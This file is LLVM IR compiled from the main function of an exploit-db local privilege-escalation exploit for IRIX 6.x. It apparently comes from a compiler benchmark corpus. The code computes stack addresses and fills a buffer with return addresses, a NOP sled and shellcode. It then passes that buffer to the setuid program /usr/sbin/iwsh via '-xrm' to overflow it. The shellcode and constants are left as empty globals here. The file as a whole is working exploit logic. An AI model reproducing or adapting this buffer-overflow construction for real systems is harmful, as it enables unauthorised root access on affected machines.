; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/irix/local/extr_337.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/irix/local/extr_337.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@irix_shellcode = common dso_local global i32* null, align 8
@get_sp_code = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [33 x i8] c"Recompile with the '-32' option\0A\00", align 1
@buf = common dso_local global i32* null, align 8
@OFFSET = common dso_local global i32 0, align 4
@GP_OFFSET = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [40 x i8] c"Sorry - this exploit for Irix 6.x only\0A\00", align 1
@NUM_ADDRESSES = common dso_local global i32 0, align 4
@BUF_LENGTH = common dso_local global i32 0, align 4
@IRIX_NOP = common dso_local global i32 0, align 4
@EXTRA = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [32 x i8] c"stack = 0x%x, targ_addr = 0x%x\0A\00", align 1
@.str.3 = private unnamed_addr constant [15 x i8] c"/usr/sbin/iwsh\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"iwsh\00", align 1
@.str.5 = private unnamed_addr constant [5 x i8] c"-xrm\00", align 1
@.str.6 = private unnamed_addr constant [13 x i8] c"execl failed\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca [1 x i8*], align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32 ()*, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %13 = bitcast [1 x i8*]* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %13, i8 0, i64 8, i1 false)
  %14 = load i32*, i32** @irix_shellcode, align 8
  %15 = bitcast i32* %14 to i8*
  %16 = call i32 @strlen(i8* %15)
  %17 = add nsw i32 %16, 1
  store i32 %17, i32* %11, align 4
  %18 = load i32, i32* @get_sp_code, align 4
  %19 = sext i32 %18 to i64
  %20 = inttoptr i64 %19 to i32 ()*
  store i32 ()* %20, i32 ()** %12, align 8
  %21 = load i32 ()*, i32 ()** %12, align 8
  %22 = call i32 %21()
  store i32 %22, i32* %7, align 4
  %23 = load i32, i32* %7, align 4
  %24 = and i32 %23, -2147483648
  %25 = icmp ne i32 %24, 0
  br i1 %25, label %26, label %29

26:                                               ; preds = %2
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str, i64 0, i64 0))
  %28 = call i32 @exit(i32 1) #4
  unreachable

29:                                               ; preds = %2
  %30 = load i32*, i32** @buf, align 8
  store i32* %30, i32** %9, align 8
  %31 = load i32, i32* %7, align 4
  %32 = load i32, i32* @OFFSET, align 4
  %33 = add nsw i32 %31, %32
  store i32 %33, i32* %6, align 4
  %34 = load i32, i32* %3, align 4
  %35 = icmp sgt i32 %34, 1
  br i1 %35, label %36, label %44

36:                                               ; preds = %29
  %37 = load i8**, i8*** %4, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 1
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 @atoi(i8* %39)
  %41 = mul nsw i32 %40, 4
  %42 = load i32, i32* %6, align 4
  %43 = add nsw i32 %42, %41
  store i32 %43, i32* %6, align 4
  br label %44

44:                                               ; preds = %36, %29
  %45 = load i32, i32* %6, align 4
  %46 = load i32, i32* @GP_OFFSET, align 4
  %47 = add nsw i32 %45, %46
  %48 = icmp ugt i32 %47, -2147483648
  br i1 %48, label %49, label %52

49:                                               ; preds = %44
  %50 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.1, i64 0, i64 0))
  %51 = call i32 @exit(i32 1) #4
  unreachable

52:                                               ; preds = %44
  %53 = load i32, i32* %6, align 4
  %54 = load i32, i32* @NUM_ADDRESSES, align 4
  %55 = add nsw i32 %53, %54
  %56 = load i32, i32* @BUF_LENGTH, align 4
  %57 = load i32, i32* %11, align 4
  %58 = sub nsw i32 %56, %57
  %59 = sdiv i32 %58, 2
  %60 = add nsw i32 %55, %59
  %61 = and i32 %60, -4
  store i32 %61, i32* %8, align 4
  br label %62

62:                                               ; preds = %80, %52
  %63 = load i32, i32* %8, align 4
  %64 = and i32 %63, -16777216
  %65 = icmp eq i32 %64, 0
  br i1 %65, label %78, label %66

66:                                               ; preds = %62
  %67 = load i32, i32* %8, align 4
  %68 = and i32 %67, 16711680
  %69 = icmp eq i32 %68, 0
  br i1 %69, label %78, label %70

70:                                               ; preds = %66
  %71 = load i32, i32* %8, align 4
  %72 = and i32 %71, 65280
  %73 = icmp eq i32 %72, 0
  br i1 %73, label %78, label %74

74:                                               ; preds = %70
  %75 = load i32, i32* %8, align 4
  %76 = and i32 %75, 255
  %77 = icmp eq i32 %76, 0
  br label %78

78:                                               ; preds = %74, %70, %66, %62
  %79 = phi i1 [ true, %70 ], [ true, %66 ], [ true, %62 ], [ %77, %74 ]
  br i1 %79, label %80, label %83

80:                                               ; preds = %78
  %81 = load i32, i32* %8, align 4
  %82 = add nsw i32 %81, 4
  store i32 %82, i32* %8, align 4
  br label %62

83:                                               ; preds = %78
  store i32 0, i32* %10, align 4
  br label %84

84:                                               ; preds = %104, %83
  %85 = load i32, i32* %10, align 4
  %86 = sext i32 %85 to i64
  %87 = load i32, i32* @NUM_ADDRESSES, align 4
  %88 = sext i32 %87 to i64
  %89 = udiv i64 %88, 16
  %90 = icmp ult i64 %86, %89
  br i1 %90, label %91, label %107

91:                                               ; preds = %84
  %92 = load i32, i32* %6, align 4
  %93 = load i32*, i32** %9, align 8
  %94 = getelementptr inbounds i32, i32* %93, i32 1
  store i32* %94, i32** %9, align 8
  store i32 %92, i32* %93, align 4
  %95 = load i32, i32* %6, align 4
  %96 = load i32*, i32** %9, align 8
  %97 = getelementptr inbounds i32, i32* %96, i32 1
  store i32* %97, i32** %9, align 8
  store i32 %95, i32* %96, align 4
  %98 = load i32, i32* %8, align 4
  %99 = load i32*, i32** %9, align 8
  %100 = getelementptr inbounds i32, i32* %99, i32 1
  store i32* %100, i32** %9, align 8
  store i32 %98, i32* %99, align 4
  %101 = load i32, i32* %8, align 4
  %102 = load i32*, i32** %9, align 8
  %103 = getelementptr inbounds i32, i32* %102, i32 1
  store i32* %103, i32** %9, align 8
  store i32 %101, i32* %102, align 4
  br label %104

104:                                              ; preds = %91
  %105 = load i32, i32* %10, align 4
  %106 = add nsw i32 %105, 1
  store i32 %106, i32* %10, align 4
  br label %84

107:                                              ; preds = %84
  store i32 0, i32* %10, align 4
  br label %108

108:                                              ; preds = %121, %107
  %109 = load i32, i32* %10, align 4
  %110 = sext i32 %109 to i64
  %111 = load i32, i32* @BUF_LENGTH, align 4
  %112 = load i32, i32* %11, align 4
  %113 = sub nsw i32 %111, %112
  %114 = sext i32 %113 to i64
  %115 = udiv i64 %114, 4
  %116 = icmp ult i64 %110, %115
  br i1 %116, label %117, label %124

117:                                              ; preds = %108
  %118 = load i32, i32* @IRIX_NOP, align 4
  %119 = load i32*, i32** %9, align 8
  %120 = getelementptr inbounds i32, i32* %119, i32 1
  store i32* %120, i32** %9, align 8
  store i32 %118, i32* %119, align 4
  br label %121

121:                                              ; preds = %117
  %122 = load i32, i32* %10, align 4
  %123 = add nsw i32 %122, 1
  store i32 %123, i32* %10, align 4
  br label %108

124:                                              ; preds = %108
  store i32 0, i32* %10, align 4
  br label %125

125:                                              ; preds = %140, %124
  %126 = load i32, i32* %10, align 4
  %127 = sext i32 %126 to i64
  %128 = load i32, i32* %11, align 4
  %129 = sext i32 %128 to i64
  %130 = udiv i64 %129, 4
  %131 = icmp ult i64 %127, %130
  br i1 %131, label %132, label %143

132:                                              ; preds = %125
  %133 = load i32*, i32** @irix_shellcode, align 8
  %134 = load i32, i32* %10, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds i32, i32* %133, i64 %135
  %137 = load i32, i32* %136, align 4
  %138 = load i32*, i32** %9, align 8
  %139 = getelementptr inbounds i32, i32* %138, i32 1
  store i32* %139, i32** %9, align 8
  store i32 %137, i32* %138, align 4
  br label %140

140:                                              ; preds = %132
  %141 = load i32, i32* %10, align 4
  %142 = add nsw i32 %141, 1
  store i32 %142, i32* %10, align 4
  br label %125

143:                                              ; preds = %125
  %144 = load i32, i32* %6, align 4
  %145 = load i32, i32* @GP_OFFSET, align 4
  %146 = add nsw i32 %144, %145
  %147 = load i32, i32* @NUM_ADDRESSES, align 4
  %148 = sdiv i32 %147, 2
  %149 = add nsw i32 %146, %148
  %150 = and i32 %149, -4
  store i32 %150, i32* %8, align 4
  store i32 0, i32* %10, align 4
  br label %151

151:                                              ; preds = %166, %143
  %152 = load i32, i32* %10, align 4
  %153 = sext i32 %152 to i64
  %154 = load i32, i32* @EXTRA, align 4
  %155 = sext i32 %154 to i64
  %156 = udiv i64 %155, 4
  %157 = icmp ult i64 %153, %156
  br i1 %157, label %158, label %169

158:                                              ; preds = %151
  %159 = load i32, i32* %8, align 4
  %160 = ashr i32 %159, 8
  %161 = load i32, i32* %8, align 4
  %162 = shl i32 %161, 24
  %163 = or i32 %160, %162
  %164 = load i32*, i32** %9, align 8
  %165 = getelementptr inbounds i32, i32* %164, i32 1
  store i32* %165, i32** %9, align 8
  store i32 %163, i32* %164, align 4
  br label %166

166:                                              ; preds = %158
  %167 = load i32, i32* %10, align 4
  %168 = add nsw i32 %167, 1
  store i32 %168, i32* %10, align 4
  br label %151

169:                                              ; preds = %151
  %170 = load i32*, i32** %9, align 8
  store i32 0, i32* %170, align 4
  %171 = load i32, i32* %7, align 4
  %172 = load i32, i32* %6, align 4
  %173 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.2, i64 0, i64 0), i32 %171, i32 %172)
  %174 = load i32*, i32** @buf, align 8
  %175 = getelementptr inbounds i32, i32* %174, i64 2
  %176 = getelementptr inbounds [1 x i8*], [1 x i8*]* %5, i64 0, i64 0
  %177 = call i32 @execle(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0), i32* %175, i32 0, i8** %176)
  %178 = call i32 @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.6, i64 0, i64 0))
  ret void
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #1

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @execle(i8*, i8*, i8*, i32*, i32, i8**) #2

declare dso_local i32 @perror(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
